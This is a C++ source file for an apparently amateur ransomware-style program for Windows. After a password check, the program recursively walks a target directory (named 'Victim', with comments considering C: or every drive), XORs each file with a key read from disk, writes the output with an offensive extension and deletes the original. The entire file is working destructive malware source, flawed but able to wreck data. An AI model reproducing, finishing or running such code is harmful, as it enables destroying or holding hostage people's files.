#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <stdlib.h>
using namespace std;
namespace fs = filesystem;
//Maybe this function is useless after all, since I will only attack C:, the easiest and the most important.
string getListOfDrives() {    //vectors in C++ are like lists in Python
    string arrayOfDrives;
    char* szDrives = new char[MAX_PATH]();       // MAX_PATH is the maximum size of a path. They know better. We add the () in order to have automaticaly '\0'
	char temp[4] = {'\0', '\0', '\0', '\0'};        
   	GetLogicalDriveStrings(MAX_PATH, szDrives);  //szDrives is a pointer to a 'string' which receives the name of a 'file' in the computer. Returns all the disks
    for (int i = 0; i < MAX_PATH; i += 4)
        if (szDrives[i] != '\0') {
        	temp[0] = szDrives[i]; temp[1] = szDrives[i+1]; temp[2] = szDrives[i+2];
        	arrayOfDrives = temp;  //push_back is like append in Python
        	break;
		}
    delete[] szDrives;   //necessary so as to handle correctely dynamic arrays
    return arrayOfDrives;
}

void Xor(string const& Path) {
	ifstream reader (Path, ios::in | ios::binary);
	ifstream key_reader ("Internet\\Hacking\\key.txt", ios::in | ios::binary);
	ofstream writer (Path + ".fuckyou", ios::out | ios::binary);
	char buffer [64], key [64];
	key_reader >> key;
	while(reader.read(buffer, 64)) {
		for(size_t i = 0; i < 64; i++){
			buffer[i] ^= key[i];
		}
		writer.write(buffer, 64);
	}
}

int main() {
	//Security first
	ifstream pass ("Internet\\Hacking\\mdp.txt");
	string passwd, true_passwd;
	cout << "This is a dangerous code (aka a **r**). Type the password so as to execute it. It's your last chance to come back." << endl;
	cin >> passwd;
	pass >> true_passwd;
	pass.close();
	if(passwd != true_passwd) {
		cout << "This is the wrong password\n";
		system("PAUSE");
		exit(17);
	}
	//True code
	string disk = "Victim";  //getListOfDrives() or C: ????
	bool to_continue = true;
	auto iter = fs::recursive_directory_iterator(disk);   // fs::directory_options::skip_permission_denied does not work at all. It's FAKE CODE
	while(to_continue){
		to_continue = false;
		try {
		for(auto& file : iter) {
			if(!fs::is_directory(file)) 
			Xor(file.path().string());
			remove(file.path().string().c_str());
		}}
		catch(const fs::filesystem_error&) {
			to_continue = true;
			iter ++;
		}
	}
}


